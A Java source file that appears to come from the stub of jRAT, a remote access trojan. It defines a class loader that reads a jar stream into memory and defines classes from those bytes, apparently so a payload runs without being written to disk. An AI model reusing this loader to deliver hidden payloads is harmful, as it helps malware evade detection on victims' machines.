package se.jrat.stub;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

public class InjectorClassloader extends ClassLoader {

	private final HashMap<String, byte[]> classes = new HashMap<String, byte[]>();
	private final HashMap<String, byte[]> others = new HashMap<String, byte[]>();

	public InjectorClassloader(ClassLoader parent, JarInputStream stream) {
		super(parent);
		this.loadResources(stream);
	}

	@Override
	public InputStream getResourceAsStream(String name) {
		byte[] buffer = others.get(name);
		if (buffer != null) {
			return new ByteArrayInputStream(buffer);
		} else {
			return null;
		}
	}

	@Override
	public URL getResource(String name) {
		return null; // cant get url from resource in memorys
	}

	@Override
	protected Enumeration<URL> findResources(String name) throws IOException {
		throw new IOException("Cant get URL from resource in memory");
	}

	@Override
	public int hashCode() {
		return getParent().hashCode();
	}

	@Override
	public Class<?> findClass(String name) throws ClassNotFoundException {
		byte[] data = getClassData(name);

		if (data != null) {
			return defineClass(name, data, 0, data.length, Injector.class.getProtectionDomain());
		} else {
			throw new ClassNotFoundException(name);
		}
	}

	public void loadResources(JarInputStream stream) {
		byte[] buffer = new byte[1024];

		int count;

		try {
			JarEntry entry = null;
			while ((entry = stream.getNextJarEntry()) != null) {
				int size = (int) entry.getSize();

				ByteArrayOutputStream out = new ByteArrayOutputStream(size == -1 ? 1024 : size);

				while ((count = stream.read(buffer)) != -1) {
					out.write(buffer, 0, count);
				}

				out.close();

				byte[] array = out.toByteArray();

				if (entry.getName().toLowerCase().endsWith(".class")) {
					classes.put(Injector.getClassName(entry.getName()), array);
				} else {
					others.put(entry.getName(), array);
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@Override
	public boolean equals(Object o) {
		if (o instanceof InjectorClassloader) {
			return ((InjectorClassloader) o).getParent() == getParent();
		}
		return false;
	}

	public byte[] getClassData(String name) {
		byte[] b = classes.get(name);
		classes.remove(name);
		return b;
	}

}